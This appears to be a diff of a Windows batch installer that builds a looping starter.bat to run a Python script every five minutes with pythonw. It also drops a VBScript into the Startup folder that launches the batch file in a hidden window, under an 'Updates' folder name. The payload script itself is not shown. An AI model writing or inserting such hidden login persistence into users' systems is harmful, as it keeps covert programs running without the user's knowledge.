@@ -88,12 +88,12 @@ REM Create Batch script file (starter.bat)
 echo.>"%updates_folder%\starter.bat"
 echo.@echo off>>"%updates_folder%\starter.bat"
 echo.:loop>>"%updates_folder%\starter.bat"
-echo.pythonw main.py>>"%updates_folder%\starter.bat"
+echo.pythonw C:\Updates\main.py>>"%updates_folder%\starter.bat"
 echo.timeout /t 300>>"%updates_folder%\starter.bat"
 echo.goto loop>>"%updates_folder%\starter.bat"
 
 REM Create VBScript file (starter.vbs) in the Startup folder
 set "startup_folder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 echo.>"%startup_folder%\starter.vbs"
-echo.CreateObject("Wscript.Shell").Run "%updates_folder%\starter.bat",0,True>>"%startup_folder%\starter.vbs"
+echo.CreateObject("Wscript.Shell").Run "C:\Updates\starter.bat",0,True>>"%startup_folder%\starter.vbs"
 
